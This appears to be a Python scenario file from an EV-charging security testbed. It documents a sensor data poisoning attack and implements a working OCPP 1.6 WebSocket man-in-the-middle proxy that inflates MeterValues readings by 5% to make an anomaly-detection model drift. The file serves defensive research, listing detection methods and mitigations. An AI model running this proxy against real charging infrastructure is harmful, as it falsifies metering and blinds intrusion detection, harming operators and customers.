"""
Anomali Senaryosu #7: Sensor Data Poisoning (MP Poisoning)
MitM Proxy kullanarak sayaç verilerini (MeterValues) manipüle etme ve Dashboard'a raporlama.
"""

import asyncio
import logging
import json
import argparse
import time
import requests
from typing import Dict, Any, Optional
from datetime import datetime
import websockets
from websockets.client import WebSocketClientProtocol

# --- SENARYO TANIMI ---
SCENARIO_07 = {
    "id": 7,
    "name": "Sensor Data Poisoning (SDP)",
    "category": "Tampering / Integrity",
    "severity": "HIGH",
    
    "description": """
    Bu senaryo, şarj istasyonlarındaki akım, gerilim veya enerji ölçümü yapan sensörlerin
    verilerinin istatistiksel olarak zehirlenmesi (poisoning) yoluyla yapay zeka tabanlı
    anomali tespit sistemlerinin yanıltılmasını ele alır.
    
    Hedef: Modelin öğrenme sürecine sahte veri sokarak (Model Drift) gelecekteki tespitleri
    azaltmak ve 'normal' profilini bozmaktır.
    """,
    
    "threat_classification_stride": {
        "T_Tampering": "Eğitim/Telemetri verisi manipüle edilir",
        "E_Elevation_of_Privilege": "Model davranışını değiştirme yetkisi",
        "S_Spoofing": "Sensör verisi taklidi"
    },
    
    "prerequisites": [
        "Sensör verisinin online öğrenme mekanizmasına erişimi",
        "Veri doğrulama süreçlerinin zayıf olması",
        "Saldırganın veriyi küçük sapmalarla (2-5%) değiştirebilmesi"
    ],
    
    "attack_steps": [
        "1. Keşif: Telemetri veri akışını belirle",
        "2. İnce Müdahale: Sensör verilerinde küçük ölçekli (%5) sapmalar başlat",
        "3. Kümülatif Etki: Sapmaları zamanla biriktirerek modelin 'normal' algısını boz",
        "4. Fırsat: Model körleştiğinde büyük saldırıları gerçekleştir"
    ],
    
    "expected_detection": {
        "method": "Robust Statistics / Data Provenance",
        "rule_based": {
            "K_value_drift": {
                "rule": "Uzun vadeli ortalama kayması (Mean Shift)",
                "severity": "MEDIUM"
            }
        },
        "statistical": {
            "robust_metrics": {
                "method": "Median Absolute Deviation (MAD)",
                "threshold": "Sapma > Tolerans",
                "description": "Outlier-resistant metriklerle tespit"
            }
        }
    },
    
    "implementation": {
        "simulation": "tests.scenario_07_sensor_data_poisoning.MitMProxy",
        "detection": "ml_ids.detect_model_drift()", 
        "logging": "blockchain.add_block(alert, 'WARNING')"
    },
    
    "success_criteria": [
        "Modelin doğruluk oranında düşüş (Accuracy Degradation)",
        "Normal profilin kayması (Baseline Shift)",
        "Gelecekteki saldırıların 'normal' olarak sınıflandırılması"
    ],
    
    "impacts": {
        "algorithmic": ["Algoritmik Körlük (Model Blindness)", "Model Dejenerasyonu"],
        "operational": ["Görünürde normal ama tehlikeli davranışların yayılması"],
        "financial": ["Modeli yeniden eğitme maliyeti"]
    },
    
    "mitigation_strategies": {
        "1_data_signing": {
            "priority": "CRITICAL",
            "description": "Veri Kaynağı Doğrulaması (Source Signing)",
            "implementation": "Telemetri verilerinin imzalanması"
        },
        "2_robust_ml": {
            "priority": "HIGH",
            "description": "Adversarial Training & Robust Statistics",
            "implementation": "Zehirlenmeye dirençli algoritmalar kullanımı"
        }
    },
    
    "test_configuration": {
        "proxy_port": 9023,
        "target_port": 9000,
        "poisoning_factor": 1.05
    }
}

# --- MITM PROXY IMPLEMENTATION ---

logger = logging.getLogger("MitM-Scenario7")

class MitMProxy:
    """
    Scenario #7 için özelleştirilmiş MitM Proxy.
    MeterValues mesajlarını zehirler ve Dashboard API'ye raporlar.
    """
    
    def __init__(self,
                 proxy_port: int = 9023,
                 target_host: str = 'localhost',
                 target_port: int = 9000,
                 poisoning_factor: float = 1.05,
                 api_url: str = "http://localhost:8000/api/alerts"):
        self.proxy_port = proxy_port
        self.target_host = target_host
        self.target_port = target_port
        self.poisoning_factor = poisoning_factor
        self.api_url = api_url
        self.running = False
        
    async def start(self):
        self.running = True
        logger.info(f"🎭 MitM Proxy (Scenario #7) başlatılıyor: Port {self.proxy_port}")
        logger.info(f"🧪 Zehirleme Oranı: x{self.poisoning_factor} (+%{(self.poisoning_factor-1)*100:.0f})")
        
        async with websockets.serve(self.handle_client, '0.0.0.0', self.proxy_port):
            logger.info(f"✅ Proxy Dinleniyor: ws://0.0.0.0:{self.proxy_port}")
            await asyncio.Future()  # Run forever

    async def handle_client(self, client_ws: WebSocketClientProtocol, path: str):
        target_url = f"ws://{self.target_host}:{self.target_port}{path}"
        logger.info(f"🔗 Yeni Bağlantı: {path} -> {target_url}")
        
        try:
            async with websockets.connect(target_url, subprotocols=['ocpp1.6']) as server_ws:
                await asyncio.gather(
                    self.forward_client_to_server(client_ws, server_ws),
                    self.forward_server_to_client(server_ws, client_ws)
                )
        except Exception as e:
            logger.error(f"❌ Bağlantı Hatası: {e}")
            await client_ws.close()

    async def forward_client_to_server(self, client: WebSocketClientProtocol, server: WebSocketClientProtocol):
        """Client -> Server (Burada zehirleme yapıyoruz)"""
        try:
            async for message in client:
                modified_message = self.intercept_and_modify(message)
                await server.send(modified_message)
        except websockets.exceptions.ConnectionClosed:
            pass

    async def forward_server_to_client(self, server: WebSocketClientProtocol, client: WebSocketClientProtocol):
        """Server -> Client (Olduğu gibi iletiyoruz)"""
        try:
            async for message in server:
                await client.send(message)
        except websockets.exceptions.ConnectionClosed:
            pass

    def intercept_and_modify(self, raw_message: str) -> str:
        """Mesajı analiz et ve gerekirse değiştir"""
        try:
            # OCPP Mesaj Formatı: [MessageType, MessageId, Action, Payload]
            msg_json = json.loads(raw_message)
            
            if isinstance(msg_json, list) and len(msg_json) == 4:
                action = msg_json[2]
                
                if action == "MeterValues":
                    logger.warning("📥 [YAKALANDI] MeterValues mesajı tespit edildi")
                    return self.poison_meter_values(msg_json)
                    
            return raw_message
            
        except Exception as e:
            logger.error(f"⚠️ Parse Hatası: {e}")
            return raw_message

    def poison_meter_values(self, msg_json: list) -> str:
        """MeterValues payload'unu manipüle et"""
        try:
            payload = msg_json[3]
            modified = False
            original_rp = 0
            poisoned_rp = 0
            
            # Payload yapısını gez: meterValue -> sampledValue -> value
            if 'meterValue' in payload:
                for mv in payload['meterValue']:
                    if 'sampledValue' in mv:
                        for sv in mv['sampledValue']:
                            if 'value' in sv:
                                original_val = float(sv['value'])
                                poisoned_val = original_val * self.poisoning_factor
                                
                                # Değişikliği uygula
                                sv['value'] = str(poisoned_val) # OCPP string bekler
                                modified = True
                                
                                original_rp = original_val
                                poisoned_rp = poisoned_val
                                
                                logger.warning(f"💉 [ZEHİRLENDİ] {original_val} -> {poisoned_val:.2f}")
            
            if modified:
                # Dashboard'a alert gönder
                self.send_alert_to_dashboard(original_rp, poisoned_rp)
                return json.dumps(msg_json)
            return json.dumps(msg_json)
            
        except Exception as e:
            logger.error(f"⚠️ Zehirleme Hatası: {e}")
            return json.dumps(msg_json)

    def send_alert_to_dashboard(self, original, poisoned):
        """Dashboard'da görünmesi için API'ye alert gönder"""
        try:
            alert_data = {
                "alert_id": f"SDP-{int(time.time()*1000)}",
                "timestamp": time.time(),
                "severity": "HIGH",
                "alert_type": "Sensor Data Poisoning",
                "description": f"MeterValues manipülasyonu: {original}Wh -> {poisoned:.2f}Wh (Ratio: {self.poisoning_factor})",
                "source": "Scenario #7 Proxy",
                "data": {
                    "original_value": original,
                    "poisoned_value": poisoned
                }
            }
            # Timeout ekleyerek API kapalıysa takılmasını engelliyoruz
            requests.post(self.api_url, json=alert_data, timeout=1)
        except Exception:
            # API kapalıysa simulation durmasın, sessizce devam et
            pass


# --- TEST FONKSİYONU ---
def test_scenario_07_sensor_data_poisoning():
    """
    Senaryo #7 Metadata Doğrulama Testi
    """
    print("="*60)
    print(f"TEST: {SCENARIO_07['name']}")
    print("="*60)
    
    # 1. Zorunlu alanları kontrol et
    required_keys = ["id", "name", "severity", "attack_steps", "expected_detection"]
    for key in required_keys:
        assert key in SCENARIO_07, f"Eksik anahtar: {key}"
    
    print("Metadata formatı geçerli")
    print(f"Severity: {SCENARIO_07['severity']}")
    print(f"Port: {SCENARIO_07['test_configuration']['proxy_port']}")
    
    # 2. Proxy sınıfı kontrolü
    proxy = MitMProxy()
    assert proxy.poisoning_factor == 1.05
    print("MitM Proxy sınıfı başlatılabilir")
    
    print("\nTest Başarılı!")


if __name__ == "__main__":
    # CLI Desteği
    parser = argparse.ArgumentParser(description='Scenario #7: Sensor Data Poisoning')
    parser.add_argument('--run-proxy', action='store_true', help='MitM Proxy sunucusunu başlat')
    parser.add_argument('--test', action='store_true', help='Metadata testini çalıştır')
    
    args = parser.parse_args()
    
    # Loglama ayarları
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )
    
    if args.run_proxy:
        try:
            # Gerekli paket kontrolü
            try:
                import requests
            except ImportError:
                print("UYARI: 'requests' kütüphanesi eksik. 'pip install requests' çalıştırın.")
            
            asyncio.run(MitMProxy().start())
        except KeyboardInterrupt:
            print("\n🛑 Proxy durduruldu.")
    else:
        # Varsayılan olarak testi çalıştır
        test_scenario_07_sensor_data_poisoning()
